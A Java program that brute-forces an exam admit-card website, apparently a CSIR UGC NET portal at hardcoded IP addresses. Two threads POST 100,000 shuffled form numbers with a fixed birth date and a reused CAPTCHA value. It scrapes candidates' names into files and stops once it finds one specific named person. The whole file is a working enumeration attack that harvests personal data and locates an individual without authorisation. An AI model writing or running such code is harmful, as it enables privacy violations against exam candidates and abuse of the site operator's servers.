package admin;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Collections;

public class PingCard {

	public static void main(String[] args) throws Exception {
		
		ArrayList<Integer> list = new ArrayList<Integer>();
        for (int i=600001; i<700001; i++) {
            list.add(new Integer(i));
        }
        Collections.shuffle(list);
        System.out.println("Shuffling done");
        
        Poster t1=new Poster(list, 0, "http://14.139.227.217/admitcard/iisstart.asp");
        
        Poster t2=new Poster(list, 1, "http://14.140.247.111/admitcard/iisstart.asp");
		t1.start();
		t2.start();

	}

}

class Poster extends Thread{
	private final String USER_AGENT = "Mozilla/5.0";
	ArrayList<Integer> list=new ArrayList<Integer>();
	int start;
	String serverUrl;
	File file1;
	File file2;
	FileWriter fw1;
	FileWriter fw2;
    BufferedWriter bw1;
    BufferedWriter bw2;
    PrintWriter out1;
    PrintWriter out2;
	Poster(ArrayList<Integer> list, int start, String serverUrl) throws IOException{
		this.list=list;
		this.start=start;
		this.serverUrl=serverUrl;
		file1 = new File("nameList"+start+".txt");
		file2 = new File("ApplinList"+start+".txt");
		if(!file1.exists()){
			file1.createNewFile();
		}
		if(!file2.exists()){
			file2.createNewFile();
		}
		
		
		
	}
	public void run(){
		System.out.println("\nTesting 2 - Send Http POST request");
		for(int i=start;i<100001;i=i+2){
//			Thread.sleep(1000);
			System.out.print(i+",");
			try {
				sendPost(list.get(i));
			} catch (Exception e) {
				System.out.println("ERROR in run()");
			}
		}
	}
	// HTTP POST request
		public void sendPost(int id) throws Exception {

			String url = "http://14.139.227.217/admitcard/iisstart.asp";//serverUrl
//			http://14.140.247.111/admitcard/iisstart.asp
			URL obj = new URL(url);
			HttpURLConnection con = (HttpURLConnection) obj.openConnection();

			//add request header
			con.setRequestMethod("POST");
			con.setRequestProperty("User-Agent", USER_AGENT);
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.5");

			String urlParameters = "fmno="+id+"&frmDay=22&frmMonth=03&frmYear=1984&verification=j5QN24&verification2=j5QN24";
			
			// Send post request
			con.setDoOutput(true);
			DataOutputStream wr = new DataOutputStream(con.getOutputStream());
			wr.writeBytes(urlParameters);
			wr.flush();
			wr.close();

//			int responseCode = con.getResponseCode();
			
			
//			System.out.println("\nSending 'POST' request to URL : " + url);
//			System.out.println("Post parameters : " + urlParameters);
//			System.out.println("Response Code : " + responseCode);
			BufferedReader in = new BufferedReader(
			        new InputStreamReader(con.getInputStream()));
			String inputLine;
			StringBuffer response = new StringBuffer();

			while ((inputLine = in.readLine()) != null) {
				response.append(inputLine);
			}
			in.close();
			
			//save ids done
			fw2 = new FileWriter(file2, true);
			bw2 = new BufferedWriter(fw2);
			out2 = new PrintWriter(bw2);
			out2.println(id);
			out2.close();
			if(!response.toString().contains("Either Form No. or Date-Of-Birth is wrong") && !response.toString().contains("Not Registered for the CSIR UGC NET")){
				if(response.toString().contains("Name of the Candidate")){
					System.out.println("Post parameters : " + urlParameters);
					String nameRetrive=response.toString().substring(response.toString().indexOf("Name of the Candidate"), response.toString().indexOf("Name of the Candidate")+150);
					System.out.println(nameRetrive);
					fw1 = new FileWriter(file1, true);
					bw1 = new BufferedWriter(fw1);					
					out1 = new PrintWriter(bw1);
					out1.println(urlParameters);
					out1.println(nameRetrive);
					out1.close();
					if(response.toString().contains("ABISA SINHA")){System.exit(0);}
					
				}
				//System.out.println(response.toString());
			}

		}
}


